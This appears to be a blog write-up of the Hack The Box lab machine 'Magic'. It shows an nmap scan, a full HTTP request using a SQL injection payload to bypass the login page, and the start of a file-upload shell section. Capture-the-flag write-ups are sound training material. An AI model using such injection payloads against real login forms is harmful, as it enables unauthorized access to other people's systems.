---
layout: post
title: "HTB: Magic"
tags: htb
---

Omg it's been a month since I last wrote. Magic - here goes.

### Recce
```
# Nmap 7.80 scan initiated Mon Apr 20 00:23:23 2020 as: nmap -v -sC -sV -oN initial.txt magic.htb
Nmap scan report for magic.htb (10.10.10.185)
Host is up (0.31s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Really not much. Let's check out port 80.

### Port 80
We see the "Magic" page with a few funny pictures. At the bottom we a link to the login page - let's go there. 

### Login page
Let's try defeating this. First up there's always the SQL bypass option:
```
POST /login.php HTTP/1.1
Host: magic.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://magic.htb/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Connection: close
Cookie: PHPSESSID=50s4cqbhtikt3cosjerujbvljn
Upgrade-Insecure-Requests: 1

username=admin&password=adsf'+or+1%3d1#
```
Try it, it works. Now we can login and do some uploads. :)

### Shell via Insecure File Upload and Local File Inclusion
First up, I recommend that you try uploading a normal image file. You'll see that there's some validation on the backend for image files, preventing you from uploading malicious stuff.
